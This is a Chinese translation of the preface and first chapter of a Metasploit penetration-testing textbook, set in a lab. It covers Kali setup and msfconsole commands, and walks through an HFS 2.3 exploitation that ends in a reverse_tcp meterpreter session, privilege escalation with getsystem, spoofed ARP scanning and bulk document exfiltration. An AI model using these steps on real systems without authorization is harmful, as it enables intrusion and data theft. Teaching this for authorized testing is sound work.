# Metasploit 训练营（一）

> 原文：[`annas-archive.org/md5/D3576CBD4BA2DACF5298049382DE0018`](https://annas-archive.org/md5/D3576CBD4BA2DACF5298049382DE0018)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

渗透测试是当今商业中无处不在的必需品。随着过去几年网络犯罪和基于计算机的犯罪的增加，渗透测试已成为网络安全的核心方面之一，并有助于使企业免受内部和外部威胁的侵害。使渗透测试成为必需的原因是它有助于发现网络、系统或应用程序中的潜在缺陷。此外，它有助于从攻击者的角度识别弱点和威胁。利用系统中的各种潜在缺陷来发现它们对组织可能造成的影响以及对资产的风险因素。然而，渗透测试的成功率主要取决于对测试目标的了解。因此，我们使用两种不同的方法来进行渗透测试：黑盒测试和白盒测试。黑盒测试是指在测试目标没有先验知识的情况下进行测试。因此，渗透测试人员通过系统地收集有关目标的信息来开始测试。而在白盒渗透测试的情况下，渗透测试人员对测试目标有足够的了解，并通过识别目标的已知和未知弱点来开始测试。渗透测试分为七个不同的阶段，如下所示：

1.  **前期交互**：这一步定义了所有前期交互活动和范围定义，基本上是在测试开始之前与客户讨论的一切。

1.  **情报收集**：这个阶段完全是关于收集有关测试目标的信息，通过直接连接到目标或被动地，完全不连接到目标。

1.  **威胁建模**：这个阶段涉及将发现的信息与资产进行匹配，以找到威胁水平最高的领域。

1.  **漏洞分析**：这涉及查找和识别已知和未知的漏洞并对其进行验证。

1.  **利用**：这个阶段致力于利用前一阶段发现的漏洞。通常意味着我们试图访问目标。

1.  **后期利用**：在目标上执行的实际任务，包括下载文件、关闭系统、在目标上创建新用户账户等，都是这个阶段的一部分。这个阶段描述了在利用后需要做什么。

1.  **报告**：这个阶段包括总结测试结果并提出可能的建议和推荐，以修复目标中当前的弱点。

刚刚提到的七个阶段在只有一个测试目标时可能看起来更容易。然而，当需要测试包含数百个系统的庞大网络时，情况完全改变。因此，在这种情况下，手动工作被自动化方法取代。考虑这样一个情景，测试的系统数量恰好是 100 个，所有系统都运行相同的操作系统和服务。手动测试每个系统将消耗大量时间和精力。这种情况需要使用渗透测试框架。渗透测试框架的使用不仅可以节省时间，还可以在改变攻击向量和覆盖更广泛的测试目标方面提供更大的灵活性。渗透测试框架将消除额外的时间消耗，并有助于自动化大部分攻击向量；扫描过程；识别漏洞，最重要的是利用漏洞；从而节省时间并加快渗透测试的步伐。这就是 Metasploit 发挥作用的地方。

Metasploit 被认为是最好的和最广泛使用的渗透测试框架之一。在 IT 安全社区中享有很高的声誉，Metasploit 不仅满足了作为优秀渗透测试框架的需求，还提供了创新功能，使渗透测试人员的工作变得更加轻松。

Metasploit Bootcamp 旨在为读者提供对最流行的渗透测试框架 Metasploit 的深入了解。本书专注于使用 Metasploit 进行渗透测试，同时揭示 Metasploit 相对于传统渗透测试的许多出色功能。本书以集训营的方式深入讲解扫描技术、对各种现实软件的利用、后渗透测试、SCADA、VOIP、MSSQL、MySQL、Android 利用、AV 逃避技术等内容。在完成具有挑战性的自主练习时，您也会发现自己不断思考。

# 本书涵盖的内容

第一章《使用 Metasploit 入门》带领我们了解使用 Metasploit 进行渗透测试的绝对基础知识。它有助于制定计划并设置测试环境。此外，它系统地介绍了渗透测试的各个阶段，同时涵盖了一些尖端的后渗透模块。它进一步讨论了使用 Metasploit 相对于传统和手动测试的优势。

第二章《识别和扫描目标》涵盖了使用 Metasploit 进行情报收集和扫描。该章节重点介绍了对各种不同服务进行扫描，如 FTP、MSSQL、SNMP、HTTP、SSL、NetBIOS 等。该章节还拆解了扫描模块的格式、内部工作原理，并阐明了用于构建模块的库。

第三章《利用和获取访问权限》将我们的讨论转移到利用现实软件。该章混合了关键和中低熵漏洞的组合，并将它们作为一个挑战呈现。该章还讨论了提升和更好的访问质量，同时讨论了 Android 和浏览器利用等具有挑战性的主题。最后，该章讨论了将非 Metasploit 利用转换为与 Metasploit 兼容的利用模块的技术。

第四章《使用 Metasploit 进行后渗透》讨论了 Metasploit 的基本和高级后渗透功能。该章节讨论了 meterpreter 负载上可用的基本后渗透功能，以及高级和强大的后渗透功能，同时介绍了 Windows 和 Linux 操作系统的权限提升。

第五章《使用 Metasploit 测试服务》将讨论使用各种服务进行渗透测试。本章涵盖了 Metasploit 中一些重要的模块，帮助测试 SCADA、MySQL 数据库和 VOIP 服务。

第六章《使用 Metasploit 进行快速利用》将讨论重点转移到构建策略和脚本，以加快渗透测试过程。这一章不仅帮助了解如何改进渗透测试过程的重要知识，还揭示了许多 Metasploit 的功能，可以节省编写利用脚本的时间。最后，该章还讨论了自动化后渗透过程。

第七章，*使用 Metasploit 利用真实世界的挑战*，将行动转移到模拟真实世界问题的环境中。本章重点介绍了渗透测试人员日常生活中使用的技术，这也意味着利用并非易事；您将不得不努力获取利用这些场景的手段。本章将学习诸如暴力破解、识别应用程序、转向内部网络、破解哈希、在明文中找到密码、规避杀毒软件检测、形成复杂的 SQL 查询以及从数据库中枚举数据等技术。

# 你需要为这本书做什么

要跟随并重现本书中的示例，您将需要六到七个系统。一个可以是您的渗透测试系统-安装了 Kali Linux 的计算机-而其他可以是测试系统。或者，您可以在单个系统上工作，并设置一个具有仅主机或桥接网络的虚拟环境。

除了系统或虚拟化，您还需要 Kali Linux 的最新 ISO，该系统默认已经打包了 Metasploit，并包含了本书中示例所需的所有其他工具。

您还需要在虚拟机或实际系统上安装 Ubuntu 14.04 LTS、Windows XP、Windows 7 Home Basic、Windows Server 2008 R2、Windows Server 2012 R1、Metasploitable 2、Metasploitable 3 和 Windows 10，因为所有这些操作系统都将作为 Metasploit 的测试平台。

此外，章节中还提供了所有其他所需工具和易受攻击软件的链接。

# 这本书是为谁准备的

如果您是渗透测试人员、道德黑客或安全顾问，希望快速掌握 Metasploit 框架，并在高度安全的环境中进行高级渗透测试，那么这本书适合您。

# 约定

在这本书中，您将找到许多文本样式，用于区分不同类型的信息。以下是一些样式的示例及其含义的解释。

文本中的代码词、数据库表名、文件夹名、文件名、文件扩展名、路径名、虚拟 URL、用户输入和 Twitter 用户名显示如下：“我们可以看到，从`/tools/exploit/`目录运行`pattern_create.rb`脚本，生成 1000 字节的模式，将生成前面的输出。”

代码块设置如下：

```
def exploit
    connect
    weapon = "HEAD "
    weapon << make_nops(target['Offset'])
    weapon << generate_seh_record(target.ret)
    weapon << make_nops(19)
    weapon << payload.encoded
    weapon << " HTTP/1.0\r\n\r\n"
    sock.put(weapon)
    handler
    disconnect
  end
end

```

当我们希望引起您对代码块的特定部分的注意时，相关的行或项目将以粗体显示：

```
    weapon << make_nops(target['Offset'])
    weapon << generate_seh_record(target.ret)
    weapon << make_nops(19)
    weapon << payload.encoded

```

任何命令行输入或输出都以以下方式编写：

```
irb(main):003:1> res = a ^ b
irb(main):004:1> return res

```

**新术语**和**重要单词**以粗体显示。您在屏幕上看到的单词，例如菜单或对话框中的单词，会在文本中以这种方式出现：“我们可以看到我们已经扫描了整个网络，并发现了两台运行 FTP 服务的主机，分别是 TP-LINK FTP 服务器和 FTP 实用程序 FTP 服务器。”

警告或重要说明会以这样的方式出现。

提示和技巧会以这种方式出现。


# 第一章：开始使用 Metasploit

“百分之百的安全”将长期保持神话

* - Anupam Tiwari*

渗透测试是对网络、Web 应用程序、服务器或任何需要从安全角度进行彻底检查的设备进行有意的攻击的艺术。渗透测试的理念是在模拟真实世界的威胁的同时发现漏洞。渗透测试旨在发现系统中的漏洞和弱点，以使易受攻击的系统能够免受威胁和恶意活动的影响。

在渗透测试中取得成功很大程度上取决于使用正确的工具和技术。渗透测试人员必须选择正确的工具和方法来完成测试。在谈论渗透测试的最佳工具时，首先想到的是 Metasploit。它被认为是今天进行渗透测试的最实用工具之一。Metasploit 提供了各种各样的利用、出色的利用开发环境、信息收集和 Web 测试能力等等。

本章将帮助您了解渗透测试和 Metasploit 的基础知识，这将帮助您适应本书的节奏。

在本章中，您将执行以下操作：

+   了解在渗透测试的不同阶段使用 Metasploit

+   遵循与 Metasploit 相关的基本命令和服务

+   了解 Metasploit 的架构并快速查看库

+   使用数据库进行渗透测试管理

在本书的过程中，我将假设您对渗透测试有基本的了解，并且对 Linux 和 Windows 操作系统至少有一些了解。

在我们转向 Metasploit 之前，让我们首先建立我们的基本测试环境。本章需要两个操作系统：

+   Kali Linux

+   Windows Server 2012 R2 与**Rejetto HTTP 文件服务器**（**HFS**）2.3 服务器

因此，让我们快速设置我们的环境，并开始 Metasploit 的柔道。

# 在虚拟环境中设置 Kali Linux

在与 Metasploit 交互之前，我们需要一个测试实验室。建立测试实验室的最佳方法是收集不同的机器并在它们上安装不同的操作系统。但是，如果我们只有一台计算机，最好的方法是建立一个虚拟环境。

虚拟化在今天的渗透测试中扮演着重要角色。由于硬件成本高昂，虚拟化在渗透测试中起到了成本效益的作用。在主机操作系统下模拟不同的操作系统不仅可以节省成本，还可以节省电力和空间。建立虚拟渗透测试实验室可以防止对实际主机系统进行任何修改，并允许我们在隔离的环境中进行操作。虚拟网络允许网络利用在隔离的网络上运行，从而防止对主机系统的任何修改或使用网络硬件。

此外，虚拟化的快照功能有助于在特定时间间隔内保留虚拟机的状态。因此，快照被证明非常有用，因为我们可以在测试虚拟环境时比较或重新加载操作系统的先前状态，而无需重新安装整个软件，以防攻击模拟后文件修改。

虚拟化期望主机系统具有足够的硬件资源，如 RAM、处理能力、驱动器空间等，以确保平稳运行。

有关快照的更多信息，请参阅[`www.virtualbox.org/manual/ch01.html#snapshots`](https://www.virtualbox.org/manual/ch01.html#snapshots)。

因此，让我们看看如何使用 Kali 操作系统（最受欢迎的渗透测试操作系统，默认包含 Metasploit Framework）创建虚拟环境。

要创建虚拟环境，我们需要虚拟仿真器软件。我们可以使用两种最流行的软件之一，VirtualBox 和 VMware Player。因此，让我们通过执行以下步骤开始安装：

1.  下载 VirtualBox ([`www.virtualbox.org/wiki/Downloads`](http://www.virtualbox.org/wiki/Downloads))，并根据您的机器架构进行设置。

1.  运行设置并完成安装。

1.  现在，在安装后，按照以下截图显示的方式运行 VirtualBox 程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00196.jpeg)

1.  现在，要安装新的操作系统，请选择 New。

1.  在名称字段中输入适当的名称，并选择操作系统类型和版本，如下所示：

+   对于 Kali Linux，根据您的系统架构选择类型为 Linux 和版本为 Linux 2.6/3.x/4.x(64 位)

+   这可能看起来类似于以下截图所示的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00197.jpeg)

1.  选择要分配的系统内存量，通常为 1GB 用于 Kali Linux。

1.  下一步是创建一个虚拟磁盘，作为虚拟操作系统的硬盘。创建动态分配的磁盘。选择此选项将仅消耗足够的空间来容纳虚拟操作系统，而不是消耗主机系统的整个物理硬盘的大块空间。

1.  下一步是为磁盘分配空间；通常情况下，20-30GB 的空间就足够了。

1.  现在，继续创建磁盘，并在查看摘要后，点击创建。

1.  现在，点击开始运行。第一次运行时，将弹出一个窗口，显示启动磁盘的选择过程。通过浏览硬盘上 Kali OS 的`.iso`文件的系统路径后，点击开始进行处理。这个过程可能看起来类似于以下截图所示的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00199.jpeg)

您可以在 Live 模式下运行 Kali Linux，或者选择图形安装以进行持久安装，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00201.jpeg)

Kali Linux 的完整持久安装指南，请参考[`docs.kali.org/category/installation`](http://docs.kali.org/category/installation)。

要在 Windows 上安装 Metasploit，请参考[`community.rapid7.com/servlet/JiveServlet/downloadBody/2099-102-11-6553/windows-installation-guide.pdf`](https://community.rapid7.com/servlet/JiveServlet/downloadBody/2099-102-11-6553/windows-installation-guide.pdf)的优秀指南。

# Metasploit 的基础知识

现在我们已经完成了 Kali Linux 的设置，让我们来谈谈大局：Metasploit。Metasploit 是一个安全项目，提供了大量的利用和侦察功能，以帮助渗透测试人员。Metasploit 是由 H.D. Moore 于 2003 年创建的，自那时以来，其快速发展使其成为最受欢迎的渗透测试工具之一。Metasploit 完全由 Ruby 驱动，并提供大量的利用、有效载荷、编码技术和大量的后渗透功能。

Metasploit 有各种版本，如下所示：

+   **Metasploit Pro**：这个版本是商业版，提供了大量出色的功能，如 Web 应用程序扫描和利用以及自动利用，非常适合专业的渗透测试人员和 IT 安全团队。Pro 版用于高级渗透测试和企业安全项目。

+   **Metasploit Express**：用于基线渗透测试。此版本的 Metasploit 功能包括智能利用、自动暴力破解凭据等。这个版本非常适合中小型公司的 IT 安全团队。

+   **Metasploit 社区**：这是一个免费版本，与 Express 版本相比功能有所减少。然而，对于学生和小型企业来说，这个版本是一个不错的选择。

+   **Metasploit Framework**：这是一个命令行版本，包括所有手动任务，如手动利用、第三方导入等。这个版本完全适合开发人员和安全研究人员。

您可以从以下链接下载 Metasploit：

[`www.rapid7.com/products/metasploit/download/editions/`](https://www.rapid7.com/products/metasploit/download/editions/)

在本书中，我们将使用 Metasploit 社区和框架版本。Metasploit 还提供各种类型的用户界面，如下所示：

+   **图形用户界面**（**GUI**）**界面**：这个界面提供了点击按钮即可使用的所有选项。这个界面提供了一个用户友好的界面，有助于提供更清晰的漏洞管理。

+   **控制台界面**：这是最受欢迎的界面，也是最流行的界面。这个界面提供了 Metasploit 提供的所有选项的一体化方法。这个界面也被认为是最稳定的界面。在本书中，我们将最常使用控制台界面。

+   **命令行界面**：这是更强大的界面，支持启动利用活动，如有效载荷生成。然而，在使用命令行界面时记住每个命令是一项困难的工作。

+   **Armitage**：Raphael Mudge 的 Armitage 为 Metasploit 添加了一个整洁的黑客风格的 GUI 界面。Armitage 提供了易于使用的漏洞管理、内置 NMAP 扫描、利用建议以及使用 Cortana 脚本语言自动化功能的能力。本书的后半部分专门介绍了 Armitage 和 Cortana。

有关 Metasploit 社区的更多信息，请参阅[ ](https://community.rapid7.com/community/metasploit/blog/2011/12/21/metaspl%20oit-tutorial-an-introduction-to-metasploit-community)[`community.rapid7.com/community/metasploit/blog`](https://community.rapid7.com/community/metasploit/blog)。

# Metasploit Framework 基础知识

在我们开始使用 Metasploit Framework 之前，让我们了解 Metasploit 中使用的基本术语。然而，以下模块不仅仅是术语，而是 Metasploit 项目的核心和灵魂：

+   **Exploit**：这是一段代码，当执行时，将触发目标的漏洞。

+   **Payload**：这是在成功利用后在目标上运行的代码。它定义了我们需要在目标系统上获得的访问类型和操作。

+   **Auxiliary**：这些是提供额外功能的模块，如扫描、模糊测试、嗅探等。

+   **Encoder**：这些用于混淆模块，以避免被防病毒软件或防火墙等保护机制检测到。

+   **Meterpreter**：这是一个使用基于 DLL 注入的内存级分段器的有效载荷。它提供了各种在目标上执行的功能，使其成为一个受欢迎的选择。

# Metasploit 的架构

Metasploit 包括各种组件，如广泛的库、模块、插件和工具。Metasploit 结构的图解如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00248.jpeg)

让我们看看这些组件是什么，以及它们是如何工作的。最好从作为 Metasploit 核心的库开始。

让我们了解各种库的用途，如下表所述：

| 库名称 | 用途 |
| --- | --- |
| REX | 处理几乎所有核心功能，如设置套接字、连接、格式化和所有其他原始功能。 |
| MSF CORE | 提供了描述框架的底层 API 和实际核心。 |
| MSF BASE | 提供友好的 API 支持模块。 |

Metasploit 有许多类型的模块，它们在功能上有所不同。我们有用于创建对被利用系统的访问通道的 payload 模块。我们有辅助模块来执行诸如信息收集、指纹识别、对应用程序进行 fuzzing 和登录到各种服务等操作。让我们来看一下这些模块的基本功能，如下表所示：

| 模块类型 | 工作 |
| --- | --- |
| **Payloads** | Payloads 用于在利用后连接到或从目标系统执行操作，或执行特定任务，如安装服务等。在成功利用系统后，Payload 执行是下一步。广泛使用的 meterpreter shell 是标准的 Metasploit payload。 |
| **Auxiliary** | 辅助模块是一种执行特定任务的特殊模块，如信息收集、数据库指纹识别、扫描网络以查找特定服务和枚举等。 |
| **Encoders** | 编码器用于对 payloads 和攻击向量进行编码（或打算）以规避杀毒软件或防火墙的检测。 |
| **NOPs** | NOP 生成器用于对齐，从而使 exploits 更加稳定。 |
| **Exploits** | 触发漏洞的实际代码。 |

# Metasploit 框架控制台和命令

了解 Metasploit 的架构知识，现在让我们运行 Metasploit 以获得对命令和不同模块的实际知识。要启动 Metasploit，我们首先需要建立数据库连接，以便我们所做的一切都可以记录到数据库中。但是，使用数据库还可以通过为所有模块使用缓存和索引来加快 Metasploit 的加载时间。因此，让我们通过在终端中输入以下命令来启动`postgresql`服务：

```
root@beast:~# service postgresql start

```

现在，为了初始化 Metasploit 的数据库，让我们按照以下截图初始化`msfdb`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00204.jpeg)

在前面的截图中清楚地看到，我们已成功为 Metasploit 创建了初始数据库模式。现在让我们使用以下命令启动 Metasploit 数据库：

```
root@beast:~# msfdb start

```

我们现在准备启动 Metasploit。让我们在终端中输入`msfconsole`来启动 Metasploit，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00205.jpeg)

欢迎来到 Metasploit 控制台。让我们运行`help`命令，看看还有哪些其他命令可用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00207.jpeg)

前面截图中的命令是核心 Metasploit 命令，用于设置/获取变量、加载插件、路由流量、取消设置变量、打印版本、查找已发出命令的历史记录等。这些命令非常通用。让我们看一下基于模块的命令，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00209.jpeg)

与 Metasploit 中特定模块相关的所有内容都包含在帮助菜单的模块控制部分。使用上述命令，我们可以选择特定模块，从特定路径加载模块，获取有关模块的信息，显示与模块相关的核心和高级选项，甚至可以在线编辑模块。让我们学习一些 Metasploit 的基本命令，并熟悉这些命令的语法和语义：

| **Command** | **Usage** | **Example** |
| --- | --- | --- |
| `use` [auxiliary/exploit/payload/encoder] | 选择特定的模块开始工作。 |

```
msf>use
exploit/unix/ftp/vsftpd_234_backdoor
msf>use auxiliary/scanner/portscan/tcp 

```

|

| `show` [exploits/payloads/encoder/auxiliary/options] | 查看特定类型的可用模块列表。 |
| --- | --- |

```
msf>show payloads
msf> show options        

```

|

| `set` [options/payload] | 为特定对象设置值。 |
| --- | --- |

```
msf>set payload windows/meterpreter/reverse_tcp
msf>set LHOST 192.168.10.118
msf> set RHOST 192.168.10.112
msf> set LPORT 4444
msf> set RPORT 8080        

```

|

| `setg` [options/payload] | 全局分配值给特定对象，因此在打开模块时值不会改变。 |
| --- | --- |

```
msf>setg RHOST   192.168.10.112       

```

|

| `run` | 在设置所有必需选项后启动辅助模块。 |
| --- | --- |

```
msf>run      

```

|

| `exploit` | 启动 exploit。 |
| --- | --- |

```
msf>exploit      

```

|

| `back` | 取消选择模块并返回。 |
| --- | --- |

```
msf(ms08_067_netapi)>back
msf>        

```

|

| `Info` | 列出与特定 exploit/module/auxiliary 相关的信息。 |
| --- | --- |

```
msf>info exploit/windows/smb/ms08_067_netapi
msf(ms08_067_netapi)>info        

```

|

| `Search` | 查找特定的模块。 |
| --- | --- |

```
msf>search hfs

```

|

| `check` | 检查特定目标是否容易受到利用。 |
| --- | --- |

```
msf>check

```

|

| `Sessions` | 列出可用的会话。 |
| --- | --- |

```
msf>sessions [session   number]

```

|

| **Meterpreter 命令** | **用法** | **示例** |
| --- | --- | --- |
| `sysinfo` | 列出受损主机的系统信息。 |

```
meterpreter>sysinfo    

```

|

| `ifconfig` | 列出受损主机上的网络接口。 |
| --- | --- |

```
meterpreter>ifconfig  
meterpreter>ipconfig (Windows)

```

|

| `Arp` | 列出连接到目标的主机的 IP 和 MAC 地址。 |
| --- | --- |

```
meterpreter>arp

```

|

| `background` | 将活动会话发送到后台。 |
| --- | --- |

```
meterpreter>background

```

|

| `shell` | 在目标上放置一个 cmd shell。 |
| --- | --- |

```
meterpreter>shell     

```

|

| `getuid` | 获取当前用户的详细信息。 |
| --- | --- |

```
meterpreter>getuid        

```

|

| `getsystem` | 提升权限并获得系统访问权限。 |
| --- | --- |

```
meterpreter>getsystem       

```

|

| `getpid` | 获取 meterpreter 访问的进程 ID。 |
| --- | --- |

```
meterpreter>getpid        

```

|

| `ps` | 列出目标上运行的所有进程。 |
| --- | --- |

```
meterpreter>ps

```

|

如果您是第一次使用 Metasploit，请参考[`www.offensive-security.com/metasploit-unleashed/Msfconsole_Commands`](http://www.offensive-security.com/metasploit-unleashed/Msfconsole_Commands)获取有关基本命令的更多信息。

# 使用 Metasploit 的好处

在我们进行示例渗透测试之前，我们必须知道为什么我们更喜欢 Metasploit 而不是手动利用技术。这是因为它具有类似黑客的终端，给人一种专业的外观，还是有其他原因？与传统的手动技术相比，Metasploit 是一个很好的选择，因为有一些因素，如下所示：

+   Metasploit 框架是开源的

+   Metasploit 通过使用 CIDR 标识符支持大型测试网络

+   Metasploit 可以快速生成可更改或即时切换的有效载荷

+   在大多数情况下，Metasploit 会使目标系统保持稳定

+   GUI 环境提供了进行渗透测试的快速和用户友好的方式

# 使用 Metasploit 进行渗透测试

在了解 Metasploit 框架的基本命令之后，让我们现在使用 Metasploit 模拟一个真实的渗透测试。在接下来的部分中，我们将仅使用 Metasploit 来覆盖渗透测试的所有阶段，除了预交互阶段，这是一个通过会议、问卷调查等方式收集客户需求并了解他们期望的一般阶段。

# 假设和测试设置

在即将进行的练习中，我们假设我们的系统通过以太网或 Wi-Fi 连接到目标网络。目标操作系统是运行在端口 80 上的 Windows Server 2012 R2，同时在端口 8080 上运行 HFS 2.3 服务器。我们将在这个练习中使用 Kali Linux 操作系统。

# 第一阶段：足迹和扫描

足迹和扫描是在预交互之后的第一个阶段，根据测试方法的类型（黑盒、白盒或灰盒），足迹阶段将有很大的不同。在黑盒测试场景中，我们将针对一切进行测试，因为没有给出目标的先验知识，而在白盒方法中，我们将执行专注的应用程序和架构特定的测试。灰盒测试将结合两种方法的优点。我们将遵循黑盒方法。因此，让我们启动 Metasploit 并运行基本扫描。然而，让我们向 Metasploit 添加一个新的工作空间。添加一个新的工作空间将使扫描数据与数据库中的其他扫描数据分开，并将有助于以更轻松和更可管理的方式找到结果。要添加一个新的工作空间，只需输入`workspace -a` [新工作空间的名称]，要切换到新工作空间的上下文，只需输入`workspace`，然后输入工作空间的名称，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00210.jpeg)

在前面的截图中，我们可以看到我们添加了一个新的工作区`NetworkVAPT`并切换到它。现在让我们快速扫描网络，检查所有活动的主机。由于我们与目标处于同一网络上，我们可以使用`auxiliary/scanner/discovery/arp_sweep`模块执行 ARP 扫描，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00149.jpeg)

我们选择一个模块来使用`use`命令启动。`show options`命令将显示模块正常工作所需的所有必要选项。我们使用`set`关键字设置所有选项。在前面的插图中，我们通过将`SMAC`和`SHOST`设置为原始 IP 地址以外的任何内容来伪造我们的 MAC 和 IP 地址。我们使用了`192.168.10.1`，看起来类似于路由器的基本 IP 地址。因此，通过 ARP 扫描生成的所有数据包看起来都像是由路由器产生的。让我们运行模块，并通过分析 Wireshark 中的流量来检查我们的说法有多少有效，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00213.jpeg)

在前面的截图中，我们可以清楚地看到我们的数据包是从我们用于该模块的 MAC 和 IP 地址伪造出来的：

```
msf auxiliary(arp_sweep) > run
192.168.10.111 appears to be up.
Scanned 256 of 256 hosts (100% complete)
Auxiliary module execution completed
msf auxiliary(arp_sweep) >

```

从获得的结果中，我们有一个 IP 地址似乎是活动的，即`192.168.10.111`让我们对`192.168.10.111`执行 TCP 扫描，并检查哪些端口是打开的。我们可以使用`auxiliary/scanner/portscan/tcp`中的 portscan 模块执行 TCP 扫描，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00215.jpeg)

接下来，我们将`RHOSTS`设置为 IP 地址`192.168.10.111`。我们还可以通过使用大量线程和设置并发性来加快扫描速度，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00216.jpeg)

在扫描期间，建议对所有发现的开放端口进行横幅抓取。但是，我们将在此示例中专注于基于 HTTP 的端口。让我们使用`auxiliary/scanner/http/http_version`模块找到运行在`80`、`8080`上的 Web 服务器类型，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00218.jpeg)

我们使用`use`命令加载`http_version`扫描器模块，并将`RHOSTS`设置为`192.168.10.111`。首先，我们通过将`RPORT`设置为`80`来扫描端口`80`，结果显示为 IIS/8.5，然后我们运行端口`8080`的模块，显示该端口正在运行 HFS 2.3 web 服务器。

# 第二阶段：获取目标访问权限

完成扫描阶段后，我们知道有一个单独的 IP 地址，即

`192.168.10.111`，运行 HFS 2.3 文件服务器和 IIS 8.5 web 服务。

您必须确定所有开放端口上运行的所有服务。我们只关注基于 HTTP 的服务，仅作为示例。

IIS 8.5 服务器并不知道有任何严重的漏洞可能导致整个系统被攻破。因此，让我们尝试找到 HFS 服务器的漏洞。Metasploit 提供了`search`命令来在模块内搜索。让我们找到一个匹配的模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00219.jpeg)

我们可以看到，通过发出`search HFS`命令，Metasploit 找到了两个匹配的模块。我们可以简单地跳过第一个，因为它与 HFS 服务器不对应。让我们使用第二个，如前面的截图所示。接下来，我们只需要为漏洞利用模块设置一些以下选项以及有效负载：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00178.jpeg)

让我们将`RHOST`的值设置为`192.168.10.111`，`RPORT`设置为`8080`，`payload`设置为`windows/meterpreter/reverse_tcp`，`SRVHOST`设置为我们系统的 IP 地址，`LHOST`设置为我们系统的 IP 地址。设置好这些值后，我们可以发出`exploit`命令将漏洞利用发送到目标，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00223.jpeg)

是的！一个 meterpreter 会话已经打开！我们已成功访问了目标机器。由于`ParserLib.pas`文件中的正则表达式不好，HFS 易受远程命令执行攻击的影响，利用模块通过使用`%00`来绕过过滤来利用 HFS 脚本命令。

# 第三阶段：维持访问/后期利用/覆盖踪迹

在执法行业，保持对目标的访问或在启动时保留后门是一个非常重要的领域。我们将在接下来的章节中讨论高级持久性机制。然而，当涉及专业渗透测试时，后期利用往往比维持访问更重要。后期利用从被利用系统中收集重要信息，破解管理员帐户的哈希值，窃取凭据，收集用户令牌，通过利用本地系统漏洞获得特权访问，下载和上传文件，查看进程和应用程序等等。

让我们执行一些快速的后期利用攻击和脚本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00224.jpeg)

运行一些快速的后期利用命令，比如`getuid`，将找到被利用进程的所有者，我们的情况下是管理员。我们还可以通过发出`getpid`命令来查看被利用进程的进程 ID。最令人期待的后期利用功能之一是在需要深入网络时找出 ARP 详细信息。在 meterpreter 中，您可以通过发出`arp`命令来找到 ARP 详细信息，如前面的截图所示。

如果被利用进程的所有者是具有管理员权限的用户，则可以使用`getsystem`命令将权限级别提升到系统级别。

接下来，让我们从目标中收集文件。然而，我们不是在谈论一般的单个文件搜索和下载。让我们使用`file_collector`后期利用模块做一些与众不同的事情。我们可以在目标上扫描特定类型的文件，并自动将它们下载到我们的系统，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00225.jpeg)

在前面的截图中，我们对受损系统的`Users`目录进行了扫描（通过提供一个带有目录路径的`-d`开关），以扫描所有扩展名为`.doc`和`.pptx`的文件（使用一个带有搜索表达式的`-f`过滤开关）。我们使用了一个`-r`开关进行递归搜索，`-o`用于将找到的文件路径输出到`files`文件中。我们可以在输出中看到我们有两个文件。此外，搜索表达式`*.doc|*.pptx`表示所有扩展名为`.doc`或`.pptx`的文件，`|`是或运算符。

让我们通过发出命令来下载找到的文件，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00227.jpeg)

我们刚刚提供了一个`-i`开关，后面跟着文件`files`，其中包含目标所有文件的完整路径。然而，我们还提供了一个`-l`开关，以指定文件将被下载到我们系统的目录。从前面的截图中可以看到，我们成功将所有文件从目标下载到了我们的机器上。

在专业的渗透测试环境中掩盖您的踪迹可能不太合适，因为大多数蓝队使用渗透测试生成的日志来识别问题和模式，或编写 IDS/IPS 签名。

# 总结和练习

在本章中，我们学习了 Metasploit 的基础知识和渗透测试的阶段。我们了解了`Metasploit`命令的各种语法和语义。我们看到了如何初始化数据库。我们使用 Metasploit 进行了基本扫描，并成功利用了扫描到的服务。此外，我们还看到了一些基本的后期利用模块，这些模块有助于从目标中收集重要信息。

如果您正确地跟随了，这一章已经成功地为您准备好回答以下问题：

+   Metasploit 框架是什么？

+   如何使用 Metasploit 进行端口扫描？

+   如何使用 Metasploit 进行横幅抓取？

+   Metasploit 如何用于利用易受攻击的软件？

+   什么是后渗透，如何使用 Metasploit 进行后渗透？

为了进一步自主练习，您可以尝试以下练习：

1.  在 Metasploit 中找到一个可以对运行在 21 端口的服务进行指纹识别的模块。

1.  尝试运行后渗透模块进行键盘记录、拍摄屏幕照片和获取其他用户密码。

1.  下载并运行 Metasploitable 2 并利用 FTP 模块。

